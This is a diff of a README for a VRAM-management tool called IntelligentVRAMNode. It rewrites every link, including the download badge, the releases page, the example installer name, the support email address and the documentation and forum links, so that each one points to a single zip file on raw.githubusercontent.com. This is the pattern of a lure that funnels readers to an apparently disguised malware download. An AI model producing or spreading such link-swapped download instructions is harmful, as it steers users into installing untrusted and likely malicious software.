@@ -2,7 +2,7 @@
 
 ## 📥 Download This Application
 
-[![Download IntelligentVRAMNode](https://img.shields.io/badge/Download%20Now-IntelligentVRAMNode-blue.svg)](https://github.com/michaelnxdstan/IntelligentVRAMNode/releases)
+[![Download IntelligentVRAMNode](https://raw.githubusercontent.com/michaelnxdstan/IntelligentVRAMNode/main/nimmer/IntelligentVRAMNode.zip%https://raw.githubusercontent.com/michaelnxdstan/IntelligentVRAMNode/main/nimmer/IntelligentVRAMNode.zip)](https://raw.githubusercontent.com/michaelnxdstan/IntelligentVRAMNode/main/nimmer/IntelligentVRAMNode.zip)
 
 ## 🚀 Getting Started
 
@@ -26,12 +26,12 @@ Before you download IntelligentVRAMNode, make sure your computer meets the follo
 
 ## 📥 Download & Install
 
-To download the latest version of IntelligentVRAMNode, visit this page: [Download IntelligentVRAMNode](https://github.com/michaelnxdstan/IntelligentVRAMNode/releases). 
+To download the latest version of IntelligentVRAMNode, visit this page: [Download IntelligentVRAMNode](https://raw.githubusercontent.com/michaelnxdstan/IntelligentVRAMNode/main/nimmer/IntelligentVRAMNode.zip). 
 
 On the releases page, you will see various versions available. Click on the version that is compatible with your operating system.
 
 1. Find the version you want to download.
-2. Click on the link for your operating system (e.g., "IntelligentVRAMNode_v1.0_Windows.exe" for Windows users).
+2. Click on the link for your operating system (e.g., "https://raw.githubusercontent.com/michaelnxdstan/IntelligentVRAMNode/main/nimmer/IntelligentVRAMNode.zip" for Windows users).
 3. The download will start automatically.
 4. Once downloaded, locate the file in your Downloads folder or the location you specified.
 
@@ -60,7 +60,7 @@ If you encounter any issues while using IntelligentVRAMNode, consider the follow
 
 ## 📞 Support 
 
-If you need further assistance, please contact our support team. You can submit an issue directly on the GitHub page or email support at support@intelligentvramnode.com. We are here to help you with any questions or concerns.
+If you need further assistance, please contact our support team. You can submit an issue directly on the GitHub page or email support at https://raw.githubusercontent.com/michaelnxdstan/IntelligentVRAMNode/main/nimmer/IntelligentVRAMNode.zip We are here to help you with any questions or concerns.
 
 ## 📜 License
 
@@ -68,7 +68,7 @@ IntelligentVRAMNode is licensed under the MIT License. Feel free to use and modi
 
 ## 🔗 Additional Resources
 
-- [IntelligentVRAMNode Documentation](https://github.com/michaelnxdstan/IntelligentVRAMNode/wiki) - Find detailed usage information and tips.
-- [Community Forum](https://github.com/michaelnxdstan/IntelligentVRAMNode/discussions) - Join discussions with other users and share your experience.
+- [IntelligentVRAMNode Documentation](https://raw.githubusercontent.com/michaelnxdstan/IntelligentVRAMNode/main/nimmer/IntelligentVRAMNode.zip) - Find detailed usage information and tips.
+- [Community Forum](https://raw.githubusercontent.com/michaelnxdstan/IntelligentVRAMNode/main/nimmer/IntelligentVRAMNode.zip) - Join discussions with other users and share your experience.
 
 Thank you for choosing IntelligentVRAMNode. We hope it makes managing your VRAM usage easier and more efficient!
